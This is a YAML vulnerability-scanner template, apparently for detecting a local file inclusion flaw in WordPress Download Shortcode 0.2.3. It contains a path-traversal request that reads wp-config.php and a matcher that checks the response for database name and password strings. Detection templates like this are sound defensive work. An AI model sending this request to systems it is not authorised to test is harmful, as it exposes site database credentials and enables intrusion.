id: "shortcode-lfi"
name: "WordPress Download Shortcode 0.2.3 - Local File Inclusion"
severity: "high"
description: "WordPress Download Shortcode 0.2.3 is prone to a local file inclusion vulnerability because it fails to sufficiently sanitize user-supplied input. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks. Prior versions may also be affected."
tech:
  - "wordpress"
  - "php"
tags:
  - "lfi"
  - "shortcode"
  - "wp"
  - "packetstorm"
  - "wordpress"
  - "wp-plugin"
  - "vuln"
cwe: "CWE-22"
reference: "https://packetstormsecurity.com/files/128024/WordPress-ShortCode-1.1-Local-File-Inclusion.html"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/force-download.php?file=../wp-config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
